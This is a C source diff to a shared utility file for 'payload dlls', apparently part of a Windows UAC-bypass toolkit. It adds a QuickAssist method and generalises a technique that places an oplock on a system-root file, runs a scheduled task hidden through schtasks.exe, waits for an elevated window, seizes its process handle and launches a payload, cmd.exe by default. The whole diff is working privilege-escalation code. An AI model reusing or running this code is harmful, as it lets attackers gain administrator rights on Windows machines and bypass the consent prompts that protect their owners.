@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2025
+*  (C) COPYRIGHT AUTHORS, 2017 - 2026
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.71
 *
-*  DATE:        07 Jul 2025
+*  DATE:        21 Jul 2026
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -1174,16 +1174,21 @@ BOOL ucmLaunchPayload2(
 * Purpose:
 *
 * Run payload (by default cmd.exe from system32)
+* This routine takes extra parameters - file to oplock and task to execute
 *
 */
 BOOL ucmLaunchPayload3(
+    _In_ UCM_METHOD ucmMethod,
     _In_opt_ LPWSTR pszPayload,
-    _In_opt_ DWORD cbPayload)
+    _In_opt_ DWORD cbPayload,
+    _In_ LPWSTR pszOpLockFile,
+    _In_ LPWSTR pszTask
+)
 {
     BOOL bResult = FALSE, bCommandLineAllocated = FALSE;
     ULONG i;
     HWND hwnd;
-    HANDLE hProcess;
+    HANDLE hProcess = NULL;
     LPWSTR lpCommandLine = NULL;
     SIZE_T memIO;
     OPLOCK_FILE_CONTEXT ofc;
@@ -1191,6 +1196,10 @@ BOOL ucmLaunchPayload3(
 
     WCHAR cmdbuf[MAX_PATH * 2]; //complete process command line
     WCHAR sysdir[MAX_PATH + 1]; //process working directory
+    WCHAR szOplockPath[MAX_PATH * 2];
+
+    if ((pszOpLockFile == NULL) || (pszTask == NULL))
+        return bResult;
 
     if (ucmCheckUIAccessPermissions()) {
 
@@ -1221,7 +1230,6 @@ BOOL ucmLaunchPayload3(
             //
             // Default cmd.exe should be started.
             //
-
             RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
 
             //
@@ -1230,8 +1238,8 @@ BOOL ucmLaunchPayload3(
             RtlSecureZeroMemory(sysdir, sizeof(sysdir));
             ucmxQuerySystemDirectory(sysdir, FALSE);
 
-            _strcpy(cmdbuf, sysdir);
-            _strcat(cmdbuf, L"cmd.exe");
+            _strcpy(cmdbuf, sysdir);           
+            _strcat(cmdbuf, CMD_EXE);
 
             lpCommandLine = cmdbuf;
             bCommandLineAllocated = FALSE;
@@ -1243,15 +1251,37 @@ BOOL ucmLaunchPayload3(
 
         hwnd = ucmFindFirstElevatedWindow();
         if (!hwnd) {
-            if (ucmStartBackupLockedElevatedProcess(&ofc)) {
+
+            RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
+
+            switch (ucmMethod) {
+            case UacMethodQuickAssist:
+                _strcpy(szOplockPath, USER_SHARED_DATA->NtSystemRoot);
+                _strcat(szOplockPath, pszOpLockFile);
+                break;
+            default:
+                break;
+            }
+
+#ifdef _DEBUG
+            OutputDebugString(szOplockPath);
+            OutputDebugString(TEXT("\r\n"));
+#endif
+            if (ucmStartLockedElevatedProcess(
+                szOplockPath,
+                pszTask,
+                &ofc)) 
+            {
                 for (i = 0; i < 5000; i += 500) {
                     ucmSleep(500);
                     hwnd = ucmFindFirstElevatedWindow();
+                    if (hwnd)
+                        break;
                 }
             }
         }
-        if (hwnd)
-        {
+
+        if (hwnd) {
             RtlSecureZeroMemory(&pi, sizeof(pi));
             hProcess = ucmGetHwndFullProcessHandle(hwnd);
             if (hProcess)
@@ -1922,6 +1952,50 @@ NTSTATUS ucmIsProcessElevated(
 }
 
 /*
+* ucmQueryEnvironmentVariable
+*
+* Purpose:
+*
+* Query environment variable.
+*
+*/
+BOOL ucmQueryEnvironmentVariable(
+    _In_ LPCWSTR Name,
+    _Out_ LPWSTR Buffer,
+    _In_ ULONG BufferLength
+)
+{
+    NTSTATUS ntStatus;
+    UNICODE_STRING usName;
+    UNICODE_STRING usValue;
+
+    if (Name == NULL || Buffer == NULL || BufferLength == 0)
+        return FALSE;
+
+    RtlSecureZeroMemory(Buffer, BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlInitUnicodeStringEx(&usName, Name);
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    usValue.Buffer = Buffer;
+    usValue.Length = 0;
+    usValue.MaximumLength = (USHORT)(BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlQueryEnvironmentVariable_U(
+        NULL,
+        &usName,
+        &usValue);
+
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    Buffer[usValue.Length / sizeof(WCHAR)] = 0;
+
+    return TRUE;
+}
+
+/*
 * ucmSetEnvironmentVariable
 *
 * Purpose:
@@ -2394,65 +2468,102 @@ HWND ucmFindFirstElevatedWindow(
 }
 
 /*
-* ucmStartBackupLockedElevatedProcess
+* ucmRunScheduledTask
 *
 * Purpose:
 *
-* Create oplock on system file and run elevated task through schtasks.exe.
+* Run a scheduled task.
 *
 */
-BOOL ucmStartBackupLockedElevatedProcess(
-    _In_ POPLOCK_FILE_CONTEXT ofc
+BOOL ucmRunScheduledTask(
+    _In_ LPCWSTR TaskName
 )
 {
     BOOL bResult = FALSE;
-    WCHAR szTaskCmdLine[MAX_PATH * 4];
-    WCHAR szOplockPath[MAX_PATH * 2];
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    DWORD dwExitCode = 1;
+    WCHAR szTaskCmdLine[MAX_PATH * 2];
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFOW StartupInfo;
+    DWORD ExitCode = ERROR_GEN_FAILURE;
 
-    if (ofc == NULL || ofc->Length < sizeof(OPLOCK_FILE_CONTEXT)) {
+    if (TaskName == NULL || *TaskName == 0)
         return FALSE;
-    }
 
-    RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
-    ucmxQuerySystemDirectory(szOplockPath, FALSE);
-    _strcpy(szTaskCmdLine, szOplockPath);
-    _strcat(szOplockPath, L"WiFiCloudStore.dll");
-    _strcat(szTaskCmdLine, L"\\schtasks.exe /RUN /TN \"\\Microsoft\\Windows\\WlanSvc\\CDSSync\" /I");
+    RtlSecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+    RtlSecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
 
-    if (!ucmOpLockFile(szOplockPath, 
-        GENERIC_READ, 
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
-        TRUE, 
-        ofc)) 
+    StartupInfo.cb = sizeof(StartupInfo);
+    StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
+    StartupInfo.wShowWindow = SW_HIDE;
+
+    _strcpy(szTaskCmdLine, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(szTaskCmdLine, L"\\System32\\schtasks.exe /RUN /TN \"");
+    _strcat(szTaskCmdLine, TaskName);
+    _strcat(szTaskCmdLine, L"\" /I");
+
+    ucmSetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);
+    ucmSetEnvironmentVariable(T_SYSTEMROOT, USER_SHARED_DATA->NtSystemRoot);
+
+    if (!CreateProcess(
+        NULL,
+        szTaskCmdLine,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &StartupInfo,
+        &ProcessInfo))
     {
         return FALSE;
     }
-    
-    RtlSecureZeroMemory(&pi, sizeof(pi));
-    RtlSecureZeroMemory(&si, sizeof(si));
 
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    CloseHandle(ProcessInfo.hThread);
 
-    if (!CreateProcess(NULL, szTaskCmdLine, NULL, NULL, FALSE, 
-        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) 
-    {
-        ucmReleaseOpLock(ofc);
-        return FALSE;
-    }
-
-    CloseHandle(pi.hThread);
-    if (WaitForSingleObject(pi.hProcess, 3000) == WAIT_OBJECT_0) {
-        if (GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
-            bResult = (dwExitCode == 0);
+    if (WaitForSingleObject(ProcessInfo.hProcess, 3000) == WAIT_OBJECT_0) {
+        if (GetExitCodeProcess(ProcessInfo.hProcess, &ExitCode)) {
+            bResult = (ExitCode == ERROR_SUCCESS);
         }
     }
 
-    CloseHandle(pi.hProcess);
+    CloseHandle(ProcessInfo.hProcess);
+
+    return bResult;
+}
+
+/*
+* ucmStartLockedElevatedProcess
+*
+* Purpose:
+*
+* Create oplock on file and run scheduled task.
+*
+*/
+BOOL ucmStartLockedElevatedProcess(
+    _In_ LPCWSTR OplockFile,
+    _In_ LPCWSTR TaskName,
+    _In_ POPLOCK_FILE_CONTEXT ofc
+)
+{
+    BOOL bResult;
+
+    if (OplockFile == NULL || TaskName == NULL || ofc == NULL)
+        return FALSE;
+
+    if (ofc->Length < sizeof(OPLOCK_FILE_CONTEXT))
+        return FALSE;
+
+    if (!ucmOpLockFile(
+        OplockFile,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        TRUE,
+        ofc))
+    {
+        return FALSE;
+    }
+
+    bResult = ucmRunScheduledTask(TaskName);
 
     if (!bResult) {
         ucmReleaseOpLock(ofc);
